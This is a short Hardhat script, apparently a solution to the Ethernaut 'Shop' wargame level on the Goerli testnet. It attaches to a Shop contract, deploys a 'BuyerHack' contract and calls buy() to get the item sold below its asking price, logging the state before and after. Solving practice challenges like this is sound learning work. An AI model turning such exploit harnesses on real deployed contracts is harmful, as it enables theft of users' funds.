// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
    // https://goerli.etherscan.io/tx/0xd9e7030bc7e1db5c881b4e8b4e3fc2bac0aca66f7de66c61375bb331ebcd7294
    const INSTANCE_ADDRESS = '0xD0046540Ec1Bc204ecf2fd326DE5F82ec4491d1A';
    const Shop = await hre.ethers.getContractFactory("Shop");
    const shop = Shop.attach(INSTANCE_ADDRESS);
    // const shop = await Shop.deploy();
    // await shop.deployed();

    console.log(await shop.price());
    console.log(await shop.isSold());

    const BuyerHack = await hre.ethers.getContractFactory("BuyerHack");
    const buyerHack = await BuyerHack.deploy(shop.address);
    await buyerHack.deployed();

    const tx = await buyerHack.buy();
    await tx.wait()

    console.log(await shop.price());
    console.log(await shop.isSold());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
